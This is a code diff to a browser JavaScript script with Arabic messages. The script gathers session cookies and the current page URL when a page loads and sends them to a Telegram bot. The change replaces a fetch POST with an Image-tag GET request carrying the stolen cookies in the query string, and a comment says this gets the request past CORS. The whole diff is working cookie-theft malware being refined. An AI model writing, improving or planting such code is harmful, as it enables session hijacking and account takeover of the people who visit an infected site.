@@ -39,7 +39,7 @@
             const value = parts.slice(1).join("=").trim();
             
             if (SESSION_COOKIE_NAMES.has(name)) {
-                foundText += `${name} = ${value}\n`;
+                foundText += `${name}=${value}\n`;
             }
         }
         return foundText;
@@ -52,22 +52,15 @@
             return;
         }
 
-        const message = `🔔 تنبيه جديد!\n\n🌐 الرابط:\n${window.location.href}\n\n🍪 الكوكيز المستخرجة:\n${cookiesText}`;
+        const message = `🔔 تنبيه جديد!\n\n🌐 الرابط:\n${window.location.href}\n\n🍪 الكوكيز:\n${cookiesText}`;
 
-        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        // استخدام طريقة الـ Image لجعل الطلب يمر فوراً بدون مشاكل CORS
+        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
-        fetch(telegramUrl, {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-                chat_id: chatId,
-                text: message
-            })
-        })
-        .then(response => console.log("تم الإرسال بنجاح"))
-        .catch(error => console.error("خطأ:", error));
+        const img = new Image();
+        img.src = telegramUrl;
+        
+        console.log("تم الإرسال بنجاح");
     }
 
     window.addEventListener("DOMContentLoaded", () => {
